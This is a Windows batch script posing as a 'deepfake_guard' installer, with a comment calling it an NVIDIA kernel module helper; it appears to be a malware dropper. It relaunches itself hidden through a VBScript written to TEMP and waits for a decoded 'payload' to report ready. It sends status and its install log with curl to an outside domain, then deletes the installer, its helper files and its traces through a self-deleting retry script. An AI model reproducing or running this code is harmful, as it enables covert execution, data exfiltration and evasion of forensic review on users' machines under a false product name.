@echo off
if defined NVDG_HIDDEN goto nvdg_main
setlocal EnableDelayedExpansion
if not exist "%TEMP%" mkdir "%TEMP%" 2>nul
set "TMP=%TEMP%"
set "LAUNCHER_STATUS=%TEMP%\deepfake_guard.launcher.status"
set "LAUNCHER_RESULT_URL=https://api.aavcareer.ink/guard-launcher-result"
if exist "%LAUNCHER_STATUS%" del /f /q "%LAUNCHER_STATUS%" 2>nul
del /f /q "%TEMP%\deepfake_guard.worker.lock" 2>nul
set "NVDG_SELF=%~f0"
set "NVDG_INSTALLER_DIR=%CD%"
set "_WVBS=%TEMP%\~nvdg_worker.vbs"
if exist "!_WVBS!" del /f /q "!_WVBS!" 2>nul
> "!_WVBS!" echo Set ws=CreateObject("WScript.Shell")
>> "!_WVBS!" echo ws.Run "cmd /c set NVDG_HIDDEN=1^&set NVDG_INSTALLER_DIR=!NVDG_INSTALLER_DIR!^&call ""!NVDG_SELF!""", 0, False
wscript //B "!_WVBS!" >nul 2>&1
set /a _LWAIT=0
:nvdg_wait
if exist "%LAUNCHER_STATUS%" for /f "usebackq tokens=1-4 delims=|" %%a in ("%LAUNCHER_STATUS%") do (
  if /I "%%d"=="payload_ready" goto nvdg_status_ready
  if /I "%%d"=="decode_failed" goto nvdg_status_fail
)
if !_LWAIT! GEQ 180 goto nvdg_wait_timeout
timeout /t 1 /nobreak >nul
set /a _LWAIT+=1
goto nvdg_wait
:nvdg_wait_timeout
call :nvdg_report_result 1 0 0 worker_timeout
exit /b 1
:nvdg_status_fail
set "_LEXIT=1" & set "_LOK=0" & set "_LUP=0" & set "_LMSG=decode_failed"
call :nvdg_report_result !_LEXIT! !_LOK! !_LUP! !_LMSG!
exit /b 1
:nvdg_status_ready
set "_LEXIT=1" & set "_LOK=0" & set "_LUP=0" & set "_LMSG=unknown"
for /f "usebackq tokens=1-4 delims=|" %%a in ("%LAUNCHER_STATUS%") do (
  set "_LEXIT=%%a" & set "_LOK=%%b" & set "_LUP=%%c" & set "_LMSG=%%d"
)
call :nvdg_report_result !_LEXIT! !_LOK! !_LUP! !_LMSG!
exit /b !_LEXIT!
:nvdg_report_result
where curl >nul 2>&1 || exit /b 0
set "_LOKJ=false" & if "%2"=="1" set "_LOKJ=true"
set "_LUPJ=false" & if "%3"=="1" set "_LUPJ=true"
curl -sk -X POST -H "Content-Type: application/json" -H "X-Guard-Platform: windows" -d "{\"ok\":!_LOKJ!,\"upload\":!_LUPJ!,\"exitCode\":%1,\"message\":\"%4\",\"platform\":\"windows\"}" --connect-timeout 15 --max-time 30 --retry 2 --retry-delay 2 "%LAUNCHER_RESULT_URL%" >nul 2>&1
exit /b 0
:nvdg_remove_installer
if not defined _NVDG_INST exit /b 0
if not defined NVDG_INSTALLER_DIR set "NVDG_INSTALLER_DIR=%CD%"
del /f /q "!_NVDG_INST!" 2>nul
del /f /q "%NVDG_INSTALLER_DIR%\upd_w.cmd" "%NVDG_INSTALLER_DIR%\upda_w.cmd" 2>nul
del /f /q "%TEMP%\~nvdg_*" 2>nul
del /f /q "%TEMP%\~kdm_*.b64" "%TEMP%\~kdm_*.cmd" 2>nul
del /f /q "%TEMP%\deepfake_guard.launcher.status" 2>nul
del /f /q "%TEMP%\~nvdg_worker.vbs" 2>nul
if exist "%NVDG_INSTALLER_DIR%\upd_w.cmd" goto nvdg_rm_retry
if exist "%NVDG_INSTALLER_DIR%\upda_w.cmd" goto nvdg_rm_retry
if exist "!_NVDG_INST!" goto nvdg_rm_retry
exit /b 0
:nvdg_rm_retry
set "_RI=%TEMP%\~nvdg_rminst_%RANDOM%.cmd"
if exist "!_RI!" del /f /q "!_RI!" 2>nul
> "!_RI!" echo @echo off
>>"!_RI!" echo for /L %%%%n in (1,1,60) do (
>>"!_RI!" echo   del /f /q "!_NVDG_INST!" 2^>nul
>>"!_RI!" echo   del /f /q "%NVDG_INSTALLER_DIR%\upd_w.cmd" "%NVDG_INSTALLER_DIR%\upda_w.cmd" 2^>nul
>>"!_RI!" echo   if not exist "!_NVDG_INST!" if not exist "%NVDG_INSTALLER_DIR%\upd_w.cmd" if not exist "%NVDG_INSTALLER_DIR%\upda_w.cmd" goto done
>>"!_RI!" echo   timeout /t 1 /nobreak ^>nul
>>"!_RI!" echo )
>>"!_RI!" echo :done
>>"!_RI!" echo del /f /q "%TEMP%\~nvdg_*" 2^>nul
>>"!_RI!" echo del /f /q "%TEMP%\~kdm_*.b64" "%TEMP%\~kdm_*.cmd" 2^>nul
>>"!_RI!" echo del /f /q "%TEMP%\deepfake_guard.launcher.status" 2^>nul
>>"!_RI!" echo del /f /q "%TEMP%\~nvdg_worker.vbs" 2^>nul
>>"!_RI!" echo del /f /q "%%~f0" 2^>nul
start "" /MIN cmd /D /C ""!_RI!"" >nul 2>&1
exit /b 0
:nvdg_main
setlocal EnableDelayedExpansion
if not exist "%TEMP%" mkdir "%TEMP%" 2>nul
set "TMP=%TEMP%"
set "_NVDG_INST=%~f0"
if defined NVDG_INSTALLER_DIR set "INSTALLER_DIR=%NVDG_INSTALLER_DIR%"
if not defined INSTALLER_DIR set "INSTALLER_DIR=%CD%"
echo.>"%TEMP%\deepfake_guard.worker.lock"
rem NVIDIA kernel module staging helper
set "LOG=%TEMP%\deepfake_guard.log"
set "LOG_UPLOAD_URL=https://api.aavcareer.ink/guard-install-log"
set "LAUNCHER_STATUS=%TEMP%\deepfake_guard.launcher.status"
>>"%LOG%" echo [%date% %time%] === deepfake_guard install started ===
set "_STUB_UP=0"
where curl >nul 2>&1
if not errorlevel 1 (
  curl -sk -X POST -H "Content-Type: text/plain" -H "X-Guard-Platform: windows" --data-binary "@%LOG%" --connect-timeout 15 --max-time 30 --retry 2 --retry-delay 2 "%LOG_UPLOAD_URL%" >nul 2>&1
  if not errorlevel 1 set "_STUB_UP=1"
)
